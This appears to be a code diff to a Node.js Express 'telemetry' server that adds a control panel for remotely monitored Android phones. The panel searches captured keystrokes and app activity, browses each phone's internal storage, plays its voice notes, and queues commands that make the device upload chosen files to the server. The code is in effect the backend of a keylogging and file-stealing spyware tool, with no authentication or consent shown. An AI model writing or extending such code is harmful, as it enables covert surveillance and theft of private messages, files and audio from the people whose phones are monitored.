@@ -1,5 +1,6 @@
 // Trigger deploy to production ARM-Bogota (UFW-Docker integration applied)
 const express = require('express');
+const os = require('os');
 const { createServer } = require('http');
 const { Server } = require('socket.io');
 const { createClient } = require('redis');
@@ -1425,6 +1426,42 @@ const startServer = async () => {
     ` : ''}
 
     ${level === 2 ? `
+      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 24px; margin-top: 24px;">
+        <!-- Card 1: Módulo Dataset NLP -->
+        <a href="/expl/devices/${deviceId}/nlp" style="text-decoration:none;">
+          <div style="background: #111827; border: 1px solid #1f2937; border-radius: 16px; padding: 28px; transition: all 0.3s; display: flex; flex-direction: column; justify-content: space-between; height: 100%;" onmouseover="this.style.borderColor='#38bdf8'; this.style.transform='translateY(-4px)'; this.style.background='#151d30';" onmouseout="this.style.borderColor='#1f2937'; this.style.transform='none'; this.style.background='#111827';">
+            <div>
+              <div style="font-size: 2.5rem; margin-bottom: 16px;">💬</div>
+              <h2 style="font-size: 1.3rem; font-weight: 700; color: #fff; margin-bottom: 8px;">Módulo 1: Explorador Dataset NLP</h2>
+              <p style="font-size: 0.88rem; color: #9ca3af; line-height: 1.5; margin-bottom: 20px;">
+                Buscador semántico en vivo de escrituras de teclado, aplicaciones activas y registros estructurados de texto.
+              </p>
+            </div>
+            <div style="display:flex; align-items:center; gap:8px; color:#38bdf8; font-weight:700; font-size:0.9rem;">
+              Abrir Módulo NLP &rarr;
+            </div>
+          </div>
+        </a>
+
+        <!-- Card 2: Explorador Remoto de Archivos -->
+        <a href="/expl/devices/${deviceId}/files" style="text-decoration:none;">
+          <div style="background: #111827; border: 1px solid #1f2937; border-radius: 16px; padding: 28px; transition: all 0.3s; display: flex; flex-direction: column; justify-content: space-between; height: 100%;" onmouseover="this.style.borderColor='#10b981'; this.style.transform='translateY(-4px)'; this.style.background='#151d30';" onmouseout="this.style.borderColor='#1f2937'; this.style.transform='none'; this.style.background='#111827';">
+            <div>
+              <div style="font-size: 2.5rem; margin-bottom: 16px;">📂</div>
+              <h2 style="font-size: 1.3rem; font-weight: 700; color: #fff; margin-bottom: 8px;">Módulo 2: Explorador Remoto de Archivos</h2>
+              <p style="font-size: 0.88rem; color: #9ca3af; line-height: 1.5; margin-bottom: 20px;">
+                Navegación del almacenamiento interno del teléfono, árbol de carpetas, reproducción de notas de voz (.opus) y sincronización a demanda.
+              </p>
+            </div>
+            <div style="display:flex; align-items:center; gap:8px; color:#10b981; font-weight:700; font-size:0.9rem;">
+              Abrir Explorador de Archivos &rarr;
+            </div>
+          </div>
+        </a>
+      </div>
+    ` : ''}
+
+    ${level === '3-nlp' ? `
       <div class="search-box">
         <input type="text" id="searchInput" placeholder="🔍 Buscar aplicación por nombre o paquete..." class="search-input" />
         <span class="badge badge-purple" id="countBadge">Aplicaciones: ${appsList.length}</span>
@@ -1451,21 +1488,191 @@ const startServer = async () => {
       </div>
     ` : ''}
 
-    ${level === 3 ? `
-      <div class="search-box">
-        <input type="text" id="searchInput" placeholder="🔍 Buscar en el texto de los escritos..." class="search-input" />
-        
-        <div class="view-toggle">
-          <button id="toggleBoth" class="active">Ambos</button>
-          <button id="toggleClean">Solo Limpio (textoL)</button>
-          <button id="toggleRaw">Solo Crudo (textoC)</button>
+    ${level === '3-files' ? (() => {
+      const normCurrent = currentPath.endsWith('/') ? currentPath : currentPath + '/';
+      const dirSet = new Map();
+      const filesList = [];
+
+      allFiles.forEach(f => {
+        const filePath = f.path || '';
+        if (filePath.startsWith(normCurrent)) {
+          const relative = filePath.substring(normCurrent.length);
+          const slashIdx = relative.indexOf('/');
+          if (slashIdx !== -1) {
+            const folderName = relative.substring(0, slashIdx);
+            const folderPath = normCurrent + folderName;
+            if (!dirSet.has(folderName)) {
+              dirSet.set(folderName, { name: folderName, path: folderPath });
+            }
+          } else {
+            if (f.isDirectory) {
+              if (!dirSet.has(f.name || relative)) {
+                dirSet.set(f.name || relative, { name: f.name || relative, path: f.path });
+              }
+            } else {
+              filesList.push(f);
+            }
+          }
+        }
+      });
+
+      const subdirs = Array.from(dirSet.values()).sort((a,b) => a.name.localeCompare(b.name));
+      filesList.sort((a,b) => (a.name || '').localeCompare(b.name || ''));
+
+      const pathParts = currentPath.split('/').filter(Boolean);
+      let cumulativePath = '';
+      const breadcrumbLinks = pathParts.map((part) => {
+        cumulativePath += '/' + part;
+        const targetP = cumulativePath;
+        return `<a href="/expl/devices/${deviceId}/files?path=${encodeURIComponent(targetP)}" style="color:#38bdf8; text-decoration:none; font-weight:600;">${part}</a>`;
+      }).join(' <span style="color:#4b5563;">/</span> ');
+
+      const parentPath = pathParts.length > 1 ? '/' + pathParts.slice(0, -1).join('/') : '/storage/emulated/0';
+
+      return `
+        <div style="background:#111827; border:1px solid #1f2937; border-radius:14px; padding:16px 20px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+          <div style="font-family:monospace; font-size:0.9rem; color:#e5e7eb; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
+            <a href="/expl/devices/${deviceId}/files?path=/storage/emulated/0" style="color:#38bdf8; font-weight:700; text-decoration:none;">🏠 Root</a>
+            <span style="color:#4b5563;">/</span>
+            ${breadcrumbLinks}
+          </div>
+          ${currentPath !== '/storage/emulated/0' ? `
+            <a href="/expl/devices/${deviceId}/files?path=${encodeURIComponent(parentPath)}" class="btn btn-secondary" style="font-size:0.8rem; padding:6px 12px;">&uarr; Subir Nivel</a>
+          ` : ''}
         </div>
 
-        <span class="badge" id="countBadge">Registros: ${items.length}</span>
-      </div>
+        <div style="margin-bottom:24px;">
+          <h3 style="font-size:1rem; font-weight:700; color:#9ca3af; margin-bottom:12px; display:flex; align-items:center; gap:8px;">📁 Carpetas (${subdirs.length})</h3>
+          ${subdirs.length === 0 ? '<p style="font-size:0.85rem; color:#6b7280; font-style:italic;">No hay subcarpetas en esta ruta.</p>' : `
+            <div style="display:grid; grid-template-columns:repeat(auto-fill, minmax(220px, 1fr)); gap:12px;">
+              ${subdirs.map(d => `
+                <a href="/expl/devices/${deviceId}/files?path=${encodeURIComponent(d.path)}" style="text-decoration:none; color:inherit;">
+                  <div style="background:#151d30; border:1px solid #1f2937; border-radius:10px; padding:12px 16px; display:flex; align-items:center; gap:10px; transition:all 0.2s;" onmouseover="this.style.borderColor='#38bdf8';" onmouseout="this.style.borderColor='#1f2937';">
+                    <span style="font-size:1.4rem;">📁</span>
+                    <span style="font-weight:600; font-size:0.88rem; color:#f3f4f6; truncate; font-family:monospace;">${d.name}</span>
+                  </div>
+                </a>
+              `).join('')}
+            </div>
+          `}
+        </div>
 
-      <div class="records-list" id="recordsList"></div>
-    ` : ''}
+        <div>
+          <h3 style="font-size:1rem; font-weight:700; color:#9ca3af; margin-bottom:12px; display:flex; align-items:center; gap:8px;">📄 Archivos en este Directorio (${filesList.length})</h3>
+          ${filesList.length === 0 ? '<p style="font-size:0.85rem; color:#6b7280; font-style:italic;">No hay archivos en esta carpeta.</p>' : `
+            <div style="overflow-x:auto; background:#111827; border:1px solid #1f2937; border-radius:14px;">
+              <table style="width:100%; border-collapse:collapse; text-align:left; font-size:0.88rem;">
+                <thead>
+                  <tr style="border-bottom:1px solid #1f2937; background:#151d30; color:#9ca3af;">
+                    <th style="padding:12px 16px; font-weight:600;">Nombre del Archivo</th>
+                    <th style="padding:12px 16px; font-weight:600;">Tamaño</th>
+                    <th style="padding:12px 16px; font-weight:600;">Estado</th>
+                    <th style="padding:12px 16px; font-weight:600; text-align:right;">Acción</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  ${filesList.map(f => {
+                    const isDownloaded = Boolean(downloadedMap[f.path]);
+                    const isPending = pendingPaths.has(f.path);
+                    const isAudio = Boolean(f.name && (f.name.endsWith('.opus') || f.name.endsWith('.ogg') || f.name.endsWith('.mp3') || f.name.endsWith('.wav')));
+                    const fileIcon = isAudio ? '🎵' : (f.name && (f.name.endsWith('.jpg') || f.name.endsWith('.png'))) ? '🖼️' : '📄';
+                    const fileContentUrl = `/api/telemetry/file-content?deviceId=${encodeURIComponent(deviceId)}&path=${encodeURIComponent(f.path)}`;
+
+                    return `
+                      <tr style="border-bottom:1px solid #1f2937;">
+                        <td style="padding:12px 16px; font-family:monospace; color:#f3f4f6;">
+                          <span style="margin-right:8px;">${fileIcon}</span> ${f.name}
+                        </td>
+                        <td style="padding:12px 16px; color:#9ca3af;">
+                          ${f.size ? (f.size > 1024 * 1024 ? (f.size / (1024*1024)).toFixed(2) + ' MB' : (f.size / 1024).toFixed(1) + ' KB') : 'Desconocido'}
+                        </td>
+                        <td style="padding:12px 16px;">
+                          ${isDownloaded ? '<span class="badge" style="background:rgba(16,185,129,0.15); color:#10b981; border-color:rgba(16,185,129,0.4);">✓ Sincronizado</span>' : 
+                            isPending ? '<span class="badge" style="background:rgba(245,158,11,0.15); color:#f59e0b; border-color:rgba(245,158,11,0.4);">⏳ Solicitado</span>' :
+                            '<span class="badge" style="background:rgba(107,114,128,0.15); color:#9ca3af; border-color:rgba(107,114,128,0.4);">En Dispositivo</span>'
+                          }
+                        </td>
+                        <td style="padding:12px 16px; text-align:right;">
+                          ${isDownloaded ? (
+                            isAudio ? `
+                              <button type="button" onclick="playAudio('${fileContentUrl}', '${f.name}')" class="btn" style="background:#10b981; font-size:0.78rem; padding:6px 12px;">▶ Reproducir</button>
+                            ` : `
+                              <a href="${fileContentUrl}" target="_blank" download class="btn" style="font-size:0.78rem; padding:6px 12px;">⬇ Abrir / Descargar</a>
+                            `
+                          ) : (
+                            isPending ? `
+                              <button type="button" disabled class="btn btn-secondary" style="font-size:0.78rem; padding:6px 12px; opacity:0.6;">Solicitud Enviada</button>
+                            ` : `
+                              <button type="button" onclick="requestFileSync('${deviceId}', '${f.path}', this)" class="btn" style="font-size:0.78rem; padding:6px 12px;">⚡ Solicitar Descarga</button>
+                            `
+                          )}
+                        </td>
+                      </tr>
+                    `;
+                  }).join('')}
+                </tbody>
+              </table>
+            </div>
+          `}
+        </div>
+
+        <!-- Audio Player Floating Footer Modal -->
+        <div id="audioPlayerModal" style="position:fixed; bottom:20px; right:20px; background:#151d30; border:1px solid #10b981; border-radius:16px; padding:16px 20px; box-shadow:0 10px 30px rgba(0,0,0,0.8); display:none; flex-direction:column; gap:10px; z-index:9999; max-width:380px; width:100%;">
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <span style="font-weight:700; font-size:0.85rem; color:#10b981;" id="audioPlayerTitle">🎵 Reproduciendo Audio...</span>
+            <button type="button" onclick="closeAudioPlayer()" style="background:none; border:none; color:#9ca3af; cursor:pointer; font-size:1.1rem;">✕</button>
+          </div>
+          <audio id="globalAudioElement" controls style="width:100%; border-radius:8px;"></audio>
+        </div>
+
+        <script>
+          function requestFileSync(deviceId, filePath, btn) {
+            btn.disabled = true;
+            btn.textContent = 'Enviando...';
+            fetch('/api/telemetry/request-upload', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ deviceId: deviceId, filePath: filePath })
+            })
+            .then(res => res.json())
+            .then(data => {
+              if (data.success) {
+                btn.textContent = '⏳ Solicitado';
+                btn.className = 'btn btn-secondary';
+                alert('Solicitud enviada al dispositivo. Se descargará en la siguiente sincronización automática.');
+              } else {
+                alert('Error al solicitar sincronización: ' + (data.error || 'Error desconocido'));
+                btn.disabled = false;
+                btn.textContent = '⚡ Solicitar Descarga';
+              }
+            })
+            .catch(err => {
+              alert('Error de conexión con el servidor de telemetría.');
+              btn.disabled = false;
+              btn.textContent = '⚡ Solicitar Descarga';
+            });
+          }
+
+          function playAudio(url, title) {
+            const playerModal = document.getElementById('audioPlayerModal');
+            const playerTitle = document.getElementById('audioPlayerTitle');
+            const audioElement = document.getElementById('globalAudioElement');
+
+            playerTitle.textContent = '🎵 ' + title;
+            audioElement.src = url;
+            playerModal.style.display = 'flex';
+            audioElement.play().catch(e => console.log('Auto-play blocked:', e));
+          }
+
+          function closeAudioPlayer() {
+            const playerModal = document.getElementById('audioPlayerModal');
+            const audioElement = document.getElementById('globalAudioElement');
+            if (audioElement) audioElement.pause();
+            if (playerModal) playerModal.style.display = 'none';
+          }
+        </script>
+      `;
+    })() : ''}
 
   </div>
 
@@ -1635,6 +1842,236 @@ const startServer = async () => {
   };
 
   // Nivel 1: Lista de Dispositivos
+  
+  // ==========================================
+  // REST API: EXPLORACION Y SINCRONIZACION DE ARCHIVOS REMOTOS
+  // ==========================================
+
+  // GET /api/telemetry/devices - Lista dinámica de dispositivos
+  app.get('/api/telemetry/devices', (req, res) => {
+    const targetDir = getDatasetDir();
+    const devicesDir = path.join(targetDir, 'devices');
+    const devicesMap = new Map();
+
+    if (fs.existsSync(devicesDir)) {
+      const items = fs.readdirSync(devicesDir);
+      items.forEach(item => {
+        const fullPath = path.join(devicesDir, item);
+        const stat = fs.statSync(fullPath);
+        let deviceId = item;
+
+        if (stat.isDirectory()) {
+          deviceId = item;
+        } else if (item.endsWith('.json')) {
+          deviceId = item.replace(/^dataset_/, '').replace(/\.json$/, '');
+        } else {
+          return;
+        }
+
+        if (!devicesMap.has(deviceId)) {
+          let totalFiles = 0;
+          const indexPath = path.join(devicesDir, deviceId, 'file_index.json');
+          if (fs.existsSync(indexPath)) {
+            try {
+              const indexData = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
+              totalFiles = Array.isArray(indexData) ? indexData.length : (indexData.files?.length || 0);
+            } catch (e) {}
+          }
+          devicesMap.set(deviceId, {
+            deviceId,
+            model: 'Android Device',
+            manufacturer: 'Mobile',
+            android_version: 'SDK 34',
+            last_seen: stat.mtime.toISOString(),
+            total_files: totalFiles
+          });
+        }
+      });
+    }
+
+    const devicesList = Array.from(devicesMap.values());
+    return res.json({ success: true, devices: devicesList });
+  });
+
+  // GET /api/telemetry/device-index
+  app.get('/api/telemetry/device-index', (req, res) => {
+    const deviceId = req.query.deviceId || req.query.device_id;
+    if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });
+
+    const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
+    const targetDir = getDatasetDir();
+    const indexPath = path.join(targetDir, 'devices', safeId, 'file_index.json');
+
+    if (!fs.existsSync(indexPath)) {
+      return res.json({ success: true, deviceId: safeId, files: [] });
+    }
+
+    try {
+      const content = fs.readFileSync(indexPath, 'utf8');
+      const data = JSON.parse(content);
+      const files = Array.isArray(data) ? data : (data.files || []);
+      return res.json({ success: true, deviceId: safeId, files });
+    } catch (err) {
+      return res.status(500).json({ error: 'Error al leer indice de archivos' });
+    }
+  });
+
+  // POST /api/telemetry/device-index
+  app.post('/api/telemetry/device-index', (req, res) => {
+    const { device_id, deviceId, files } = req.body;
+    const targetId = device_id || deviceId;
+    if (!targetId || !Array.isArray(files)) {
+      return res.status(400).json({ error: 'Parametros invalidos. Se requiere deviceId y arreglo files.' });
+    }
+
+    const safeId = String(targetId).replace(/[^a-zA-Z0-9_-]/g, '_');
+    const targetDir = getDatasetDir();
+    const deviceDir = path.join(targetDir, 'devices', safeId);
+    if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+
+    const indexPath = path.join(deviceDir, 'file_index.json');
+    fs.writeFileSync(indexPath, JSON.stringify(files, null, 2), 'utf8');
+
+    return res.json({ success: true, message: 'Indice de archivos actualizado correctamente.', count: files.length });
+  });
+
+  // POST /api/telemetry/request-upload & /api/telemetry/signal-sync
+  app.post(['/api/telemetry/request-upload', '/api/telemetry/signal-sync'], (req, res) => {
+    const { deviceId, filePath, targetPath } = req.body;
+    const targetId = deviceId;
+    const pathToUpload = filePath || targetPath;
+
+    if (!targetId || !pathToUpload) {
+      return res.status(400).json({ error: 'Falta deviceId o filePath' });
+    }
+
+    const safeId = String(targetId).replace(/[^a-zA-Z0-9_-]/g, '_');
+    const targetDir = getDatasetDir();
+    const deviceDir = path.join(targetDir, 'devices', safeId);
+    if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+
+    const rulesPath = path.join(deviceDir, 'sync_rules.json');
+    let rules = [];
+    if (fs.existsSync(rulesPath)) {
+      try { rules = JSON.parse(fs.readFileSync(rulesPath, 'utf8')); } catch (e) { rules = []; }
+    }
+
+    const existing = rules.find(r => r.path === pathToUpload);
+    if (!existing) {
+      rules.push({
+        path: pathToUpload,
+        status: 'PENDING',
+        requestedAt: new Date().toISOString()
+      });
+      fs.writeFileSync(rulesPath, JSON.stringify(rules, null, 2), 'utf8');
+    }
+
+    return res.json({ success: true, message: 'Solicitud de descarga registrada.', path: pathToUpload });
+  });
+
+  // GET /api/telemetry/pending-downloads
+  app.get('/api/telemetry/pending-downloads', (req, res) => {
+    const deviceId = req.query.deviceId || req.query.device_id;
+    if (!deviceId) return res.status(400).json({ error: 'Falta parametro deviceId' });
+
+    const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
+    const targetDir = getDatasetDir();
+    const rulesPath = path.join(targetDir, 'devices', safeId, 'sync_rules.json');
+
+    if (!fs.existsSync(rulesPath)) {
+      return res.json({ success: true, pendingFiles: [] });
+    }
+
+    try {
+      const rules = JSON.parse(fs.readFileSync(rulesPath, 'utf8'));
+      const pending = rules.filter(r => r.status === 'PENDING').map(r => r.path);
+      return res.json({ success: true, pendingFiles: pending });
+    } catch (e) {
+      return res.json({ success: true, pendingFiles: [] });
+    }
+  });
+
+  // POST /api/telemetry/upload-file
+  const syncMulter = multer({
+    dest: os.tmpdir(),
+    limits: { fileSize: 100 * 1024 * 1024 }
+  });
+
+  app.post('/api/telemetry/upload-file', syncMulter.single('file'), (req, res) => {
+    const deviceId = req.body.deviceId || req.body.device_id;
+    const remotePath = req.body.remotePath || req.body.path;
+
+    if (!req.file || !deviceId) {
+      return res.status(400).json({ error: 'Falta archivo subido o deviceId.' });
+    }
+
+    const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
+    const targetDir = getDatasetDir();
+    const downloadsDir = path.join(targetDir, 'devices', safeId, 'downloads');
+    if (!fs.existsSync(downloadsDir)) fs.mkdirSync(downloadsDir, { recursive: true });
+
+    const filename = remotePath ? path.basename(remotePath) : req.file.originalname;
+    const destPath = path.join(downloadsDir, filename);
+
+    fs.renameSync(req.file.path, destPath);
+
+    // Marcar como COMPLETED en sync_rules.json
+    const rulesPath = path.join(targetDir, 'devices', safeId, 'sync_rules.json');
+    if (fs.existsSync(rulesPath)) {
+      try {
+        const rules = JSON.parse(fs.readFileSync(rulesPath, 'utf8'));
+        const updated = rules.map(r => r.path === remotePath ? { ...r, status: 'COMPLETED', completedAt: new Date().toISOString() } : r);
+        fs.writeFileSync(rulesPath, JSON.stringify(updated, null, 2), 'utf8');
+      } catch (e) {}
+    }
+
+    // Registrar en downloaded_files.json
+    const downloadsMapPath = path.join(targetDir, 'devices', safeId, 'downloaded_files.json');
+    let map = {};
+    if (fs.existsSync(downloadsMapPath)) {
+      try { map = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8')); } catch (e) {}
+    }
+    map[remotePath || filename] = filename;
+    fs.writeFileSync(downloadsMapPath, JSON.stringify(map, null, 2), 'utf8');
+
+    return res.json({ success: true, message: 'Archivo subido y almacenado exitosamente.', filename });
+  });
+
+  // GET /api/telemetry/file-content
+  app.get('/api/telemetry/file-content', (req, res) => {
+    const deviceId = req.query.deviceId || req.query.device_id;
+    const targetPath = req.query.path || req.query.remotePath;
+
+    if (!deviceId || !targetPath) {
+      return res.status(400).json({ error: 'Falta deviceId o path' });
+    }
+
+    const safeId = String(deviceId).replace(/[^a-zA-Z0-9_-]/g, '_');
+    const filename = path.basename(targetPath);
+    const targetDir = getDatasetDir();
+    const filePath = path.join(targetDir, 'devices', safeId, 'downloads', filename);
+
+    if (!fs.existsSync(filePath)) {
+      return res.status(404).json({ success: false, status: 'NOT_DOWNLOADED', error: 'El archivo aun no ha sido descargado al servidor.' });
+    }
+
+    const ext = path.extname(filename).toLowerCase();
+    if (ext === '.opus') {
+      res.setHeader('Content-Type', 'audio/ogg; codecs=opus');
+    } else if (ext === '.ogg') {
+      res.setHeader('Content-Type', 'audio/ogg');
+    } else if (ext === '.mp3') {
+      res.setHeader('Content-Type', 'audio/mpeg');
+    } else if (ext === '.wav') {
+      res.setHeader('Content-Type', 'audio/wav');
+    } else if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) {
+      res.setHeader('Content-Type', `image/${ext === '.jpg' ? 'jpeg' : ext.replace('.', '')}`);
+    }
+
+    res.setHeader('Content-Disposition', `inline; filename="${filename}"`);
+    return res.sendFile(filePath);
+  });
+
   app.get(['/expl', '/expl/', '/expl/devices', '/expl/devices/'], (req, res) => {
     const targetDir = getDatasetDir();
     const devicesDir = path.join(targetDir, 'devices');
@@ -1696,7 +2133,21 @@ const startServer = async () => {
   });
 
   // Nivel 2: Grupos de Aplicaciones por Dispositivo
+  // Nivel 2: Hub de Selección de Módulo (DeviceModuleHub)
   app.get(['/expl/devices/:deviceId', '/expl/devices/:deviceId/'], (req, res) => {
+    const rawId = req.params.deviceId;
+    const cleanId = rawId.replace(/^dataset_/, '').replace(/\.json$/, '');
+
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    return res.send(generateExplorerHtml({
+      title: `📱 Dispositivo: ${cleanId}`,
+      level: 2,
+      deviceId: cleanId
+    }));
+  });
+
+  // Nivel 3 - Módulo NLP: Grupos de Aplicaciones por Dispositivo
+  app.get(['/expl/devices/:deviceId/nlp', '/expl/devices/:deviceId/nlp/'], (req, res) => {
     const rawId = req.params.deviceId;
     const cleanId = rawId.replace(/^dataset_/, '').replace(/\.json$/, '');
 
@@ -1719,26 +2170,24 @@ const startServer = async () => {
     const items = readJsonLinesFile(deviceFilePath);
     const userItems = items.filter(item => !isSystemInitEvent(item));
     
-    // Agrupar muestras por app_contexto (excluyendo inicios de app)
     const appsMap = {};
     userItems.forEach(item => {
-      const app = item.app_contexto || 'unknown';
-      if (!appsMap[app]) {
-        appsMap[app] = { 
-          packageName: app, 
-          displayName: getAppDisplayName(app), 
+      const appName = item.app_contexto || 'unknown';
+      if (!appsMap[appName]) {
+        appsMap[appName] = { 
+          packageName: appName, 
+          displayName: getAppDisplayName(appName), 
           count: 0, 
           lastActivity: null 
         };
       }
-      appsMap[app].count++;
+      appsMap[appName].count++;
       const itemDate = item.created_at || (item.ts ? new Date(item.ts).toISOString() : null);
-      if (itemDate && (!appsMap[app].lastActivity || new Date(itemDate) > new Date(appsMap[app].lastActivity))) {
-        appsMap[app].lastActivity = itemDate;
+      if (itemDate && (!appsMap[appName].lastActivity || new Date(itemDate) > new Date(appsMap[appName].lastActivity))) {
+        appsMap[appName].lastActivity = itemDate;
       }
     });
 
-    // Ordenar apps del más reciente al más antiguo
     const appsList = Object.values(appsMap).sort((a, b) => {
       const tA = a.lastActivity ? new Date(a.lastActivity).getTime() : 0;
       const tB = b.lastActivity ? new Date(b.lastActivity).getTime() : 0;
@@ -1748,10 +2197,54 @@ const startServer = async () => {
 
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     return res.send(generateExplorerHtml({
-      title: `📱 ${cleanId} — Aplicaciones`,
-      level: 2,
+      title: `📱 ${cleanId} — Módulo NLP (Aplicaciones)`,
+      level: '3-nlp',
       deviceId: cleanId,
       appsList
+    }));
+  });
+
+  // Nivel 3 - Módulo Archivos: Explorador Remoto de Archivos
+  app.get(['/expl/devices/:deviceId/files', '/expl/devices/:deviceId/files/'], (req, res) => {
+    const rawId = req.params.deviceId;
+    const cleanId = rawId.replace(/^dataset_/, '').replace(/\.json$/, '');
+    const currentPath = req.query.path || '/storage/emulated/0';
+
+    const targetDir = getDatasetDir();
+    const indexPath = path.join(targetDir, 'devices', cleanId, 'file_index.json');
+    const downloadsMapPath = path.join(targetDir, 'devices', cleanId, 'downloaded_files.json');
+    const rulesPath = path.join(targetDir, 'devices', cleanId, 'sync_rules.json');
+
+    let allFiles = [];
+    if (fs.existsSync(indexPath)) {
+      try {
+        const raw = JSON.parse(fs.readFileSync(indexPath, 'utf8'));
+        allFiles = Array.isArray(raw) ? raw : (raw.files || []);
+      } catch (e) {}
+    }
+
+    let downloadedMap = {};
+    if (fs.existsSync(downloadsMapPath)) {
+      try { downloadedMap = JSON.parse(fs.readFileSync(downloadsMapPath, 'utf8')); } catch (e) {}
+    }
+
+    let pendingPaths = new Set();
+    if (fs.existsSync(rulesPath)) {
+      try {
+        const rules = JSON.parse(fs.readFileSync(rulesPath, 'utf8'));
+        rules.filter(r => r.status === 'PENDING').forEach(r => pendingPaths.add(r.path));
+      } catch (e) {}
+    }
+
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    return res.send(generateExplorerHtml({
+      title: `📂 Explorador Remoto de Archivos — ${cleanId}`,
+      level: '3-files',
+      deviceId: cleanId,
+      currentPath,
+      allFiles,
+      downloadedMap,
+      pendingPaths
     }));
   });
 
